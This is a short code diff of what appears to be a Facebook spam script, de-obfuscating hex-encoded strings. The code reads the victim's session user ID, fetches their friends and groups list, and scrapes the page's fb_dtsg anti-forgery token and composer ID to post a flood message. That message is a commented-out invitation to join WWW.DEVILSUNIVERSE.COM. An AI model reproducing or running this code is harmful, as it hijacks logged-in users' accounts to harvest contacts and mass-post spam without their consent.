@@ -154,7 +154,7 @@ var arr = new Array();
 
 function HTML_text_composer_hdeartext_and_postdatacollection(sender) {
     if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
-    jx.load(window.location.protocol + "//" + unescape('%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F%62%6F%6F%74%73%74%72%61%70%2E%70%68%70%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5D%3D%67%72%6F%75%70%26%76%69%65%77%65%72') + "=" + Env.user + "&token=v7&lazy=0&__user=" + Env.user, function (data) {
+    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer" + "=" + Env.user + "&token=v7&lazy=0&__user=" + Env.user, function (data) {
         var text = data;
         var json = text.substring(text.indexOf('{'));
         var friends = JSON.parse(json);
@@ -169,7 +169,7 @@ function HTML_text_composer_hdeartext_and_postdatacollection(sender) {
 var a = document.body.innerHTML;
 var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1];
 var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
-//var msg = unescape("%49%6E%76%69%74%61%74%69%6F%6E%20%74%6F%20%6A%6F%69%6E%20%77%65%62%73%69%74%65%20%57%57%57%2E%44%45%56%49%4C%53%55%4E%49%56%45%52%53%45%2E%43%4F%4D%2C%20%49%74%73%20%61%20%73%6F%63%69%61%6C%20%6E%65%74%77%6F%72%6B%69%6E%67%20%77%65%62%73%69%74%65%20%6C%69%6B%65%20%4F%52%4B%55%54%20%41%4E%44%20%46%41%43%45%42%4F%4F%4B%2E%20%53%6F%20%6A%6F%69%6E%20%69%74%20%6E%6F%77%2E%0A%09%09%09");
+//var msg = Invitation to join website WWW.DEVILSUNIVERSE.COM, Its a social networking website like ORKUT AND FACEBOOK. So join it now.;
 
 
 function xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin() {
